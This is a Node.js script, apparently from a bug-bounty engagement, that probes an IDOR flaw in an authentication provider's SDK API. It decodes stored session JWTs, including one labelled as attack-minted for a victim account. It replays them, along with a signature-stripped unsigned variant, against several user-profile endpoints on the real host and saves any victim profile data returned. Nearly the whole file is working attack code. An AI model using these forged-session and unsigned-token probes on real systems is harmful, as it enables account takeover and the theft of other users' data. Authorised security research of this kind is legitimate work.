#!/usr/bin/env node
// idor13d: WHO IS 3428fdb3? + does VICTIM account actually hold ev6 credential?
// 1. char-accurate decode of all involved session JWTs (victim original, attack-minted, signin result)
// 2. probe SDK user-profile endpoints with attack-minted victim session -> list verified credentials
// 3. probe same with signin session (3428fdb3) -> its email/credential state
const crypto = require('crypto');
const fs = require('fs');
const { execSync } = require('child_process');
const OUT = '/home/z/my-project/recon/idor13';
const API = 'https://app.dynamicauth.com/api/v0';
const ENV_SDK = 'fb6dd9d1-09f5-43c3-8a8c-eab6e44c37f9';

function curl(method, url, body, headers) {
  const hh = Object.entries(headers || {}).map(([k, v]) => ['-H', `${k}: ${v}`]).flat();
  const args = ['-s', '-m', '25', '-w', '\n__HTTP__%{http_code}', '-X', method, url, ...hh];
  if (body) args.push('-d', body);
  const out = execSync(`curl ${args.map(a => `'${String(a).replace(/'/g, `'\\''`)}'`).join(' ')}`, { maxBuffer: 10e6 }).toString();
  const idx = out.lastIndexOf('__HTTP__');
  return { status: parseInt(out.slice(idx + 8).trim(), 10), body: out.slice(0, idx) };
}
function claims(jwtFile) {
  try {
    const j = fs.readFileSync(jwtFile, 'utf8').trim();
    const c = JSON.parse(Buffer.from(j.split('.')[1], 'base64url').toString());
    return { c, j };
  } catch (e) { return { c: null, j: null }; }
}

console.log('===== [1] CHAR-ACCURATE CLAIM DUMP =====');
const sources = {
  'attack-minted VICTIM session (verify 11:37)': `${OUT}/../idor11/vatk_new_session.jwt`,
  'signin session TODAY (p1)': `${OUT}/p1_victim_session.jwt`,
};
for (const [label, f] of Object.entries(sources)) {
  const { c } = claims(f);
  if (!c) { console.log(`  ${label}: FILE MISSING`); continue; }
  console.log(`  -- ${label}`);
  console.log('     sub      :', c.sub);
  console.log('     email    :', c.email);
  console.log('     sid      :', c.sid);
  console.log('     scope    :', c.scope);
  console.log('     signinCred:', c.signin_credential_id);
  console.log('     credHashes:', JSON.stringify(c.verifiedCredentialsHashes));
}

console.log('===== [2] VICTIM PROFILE (attack-minted session) =====');
const v = claims(`${OUT}/../idor11/vatk_new_session.jwt`);
const s = claims(`${OUT}/p1_victim_session.jwt`);
if (!v.j) { console.log('  no victim session token — cannot probe'); }
const paths = ['/users', '/users/me', '/user', '/users/profile', '/sdk-user', '/users?includeVerifiedCredentials=true'];
for (const p of paths) {
  for (const [tk, tv] of [['full', v.j], ['mini', v.mini || (v.c ? v.j.split('.').slice(0,2).join('.') + '.' : '')]]) {
    if (!tv) continue;
    const r = curl('GET', `${API}/sdk/${ENV_SDK}${p}`, null, {
      Authorization: `Bearer ${tv}`, 'Content-Type': 'application/json',
      'X-Request-Purpose': 'Research', 'X-Bugcrowd-Ninja': 'zeno0' });
    console.log(`  GET ${p} [${tk}] -> ${r.status} ${r.body.slice(0, 220)}`);
    if (r.status === 200) {
      fs.writeFileSync(`${OUT}/victim_profile_${p.replace(/[^a-z]/gi, '_')}.json`, r.body);
      break;
    }
  }
}

console.log('===== [3] SIGNIN SESSION (3428fdb3) PROFILE =====');
if (s.j) {
  const r = curl('GET', `${API}/sdk/${ENV_SDK}/users`, null, {
    Authorization: `Bearer ${s.j}`, 'Content-Type': 'application/json',
    'X-Request-Purpose': 'Research', 'X-Bugcrowd-Ninja': 'zeno0' });
  console.log(`  GET /users [full] -> ${r.status} ${r.body.slice(0, 400)}`);
  fs.writeFileSync(`${OUT}/signin3428_profile.full`, `${r.body}\nHTTPCODE:${r.status}`);
}
console.log('done');
